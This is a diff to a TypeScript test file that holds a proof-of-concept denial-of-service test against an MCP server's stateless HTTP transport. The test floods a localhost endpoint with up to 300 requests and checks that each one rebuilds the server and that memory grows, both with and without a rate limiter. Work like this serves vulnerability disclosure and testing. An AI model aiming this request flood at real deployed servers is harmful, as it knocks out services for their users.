@@ -20,14 +20,14 @@ import { StreamableHttpTransport } from '../../server/transport/streamable-http.
 import { getServer } from '../../server/server.js';
 import { StreamableHTTPServerTransport } from '@modelcontextprotocol/sdk/server/streamableHttp.js';
 
-// Custom Rate Limiter tanpa type annotation
+// Custom Rate Limiter
 const createRateLimiter = () => {
     let windowStart = 0;
     let requestCount = 0;
     const windowMs = 1000;
     const max = 100;
 
-    return (req, res, next) => {
+    return (req: express.Request, res: express.Response, next: express.NextFunction) => {
         const now = Date.now();
         if (!windowStart || (now - windowStart > windowMs)) {
             windowStart = now;
@@ -44,9 +44,9 @@ const createRateLimiter = () => {
 };
 
 describe('[POC] DoS via Stateful Re-instantiation on Stateless HTTP Transport', () => {
-    let transport;
+    let transport: StreamableHttpTransport;
     const targetPort = 8913;
-    let originalConsoleError;
+    let originalConsoleError: typeof console.error;
 
     beforeAll(() => {
         originalConsoleError = console.error;
@@ -60,12 +60,12 @@ describe('[POC] DoS via Stateful Re-instantiation on Stateless HTTP Transport', 
     // TEST 1: Tanpa Rate Limiter (Bare-metal server)
     it('should trigger getServer() and memory exhaustion on concurrent requests', async () => {
         let getServerCallCount = 0;
-        console.error = (...args) => {
+        console.error = (...args: any[]) => {
             if (args[0] === 'Supported networks:') getServerCallCount++;
         };
 
         transport = new StreamableHttpTransport(targetPort, 'localhost', '/mcp', 'disabled');
-        await transport.start({});
+        await transport.start({} as any);
 
         const targetUrl = `http://localhost:${targetPort}/mcp`;
         const payload = { jsonrpc: '2.0', method: 'initialize', params: {}, id: 1 };
@@ -100,18 +100,16 @@ describe('[POC] DoS via Stateful Re-instantiation on Stateless HTTP Transport', 
     // TEST 2: Dengan Rate Limiter (Simulasi API Gateway 100 req/s)
     it('should still cause memory exhaustion even with a rate limiter (100 req/s)', async () => {
         let getServerCallCount = 0;
-        console.error = (...args) => {
+        console.error = (...args: any[]) => {
             if (args[0] === 'Supported networks:') getServerCallCount++;
         };
 
-        // Buat app Express manual dengan rate limiter, menggunakan handler yang SAMA PERSIS dengan kode asli
         const app = express();
         app.use(express.json());
-        app.use(createRateLimiter()); // <-- Memasang pertahanan Rate Limiter
+        app.use(createRateLimiter());
         
-        app.post('/mcp', async (req, res) => {
+        app.post('/mcp', async (req: express.Request, res: express.Response) => {
             try {
-                // Ini adalah kode rentan dari streamable-http.ts baris 45
                 const mcpServer = await getServer();
                 const httpTransport = new StreamableHTTPServerTransport({ sessionIdGenerator: undefined });
                 res.on('close', () => {
@@ -132,8 +130,7 @@ describe('[POC] DoS via Stateful Re-instantiation on Stateless HTTP Transport', 
         const memBefore = process.memoryUsage().heapUsed / 1024 / 1024;
         console.log(`\n[Test 2 - With Rate Limit] Memory before: ${memBefore.toFixed(2)} MB`);
 
-        const attackCount = 300; // Kirim 300 request
-        // Kirim request dengan delay 10ms (100 req/detik) agar semua LULUS rate limit
+        const attackCount = 300;
         for (let i = 0; i < attackCount; i++) {
             fetch(targetUrl, {
                 method: 'POST',
@@ -143,7 +140,6 @@ describe('[POC] DoS via Stateful Re-instantiation on Stateless HTTP Transport', 
             await new Promise(resolve => setTimeout(resolve, 10)); 
         }
 
-        // Tunggu semua request selesai diproses
         await new Promise(resolve => setTimeout(resolve, 3000));
 
         const memAfter = process.memoryUsage().heapUsed / 1024 / 1024;
@@ -153,9 +149,7 @@ describe('[POC] DoS via Stateful Re-instantiation on Stateless HTTP Transport', 
 
         server.close();
 
-        // Meskipun dirate-limit, semua request yang LOLOS tetap memicu getServer()
         expect(getServerCallCount).toBe(attackCount);
-        // Memory tetap membengkak karena object berat tidak bisa di-GC dengan cepat
         expect(memAfter).toBeGreaterThan(memBefore);
     });
 });
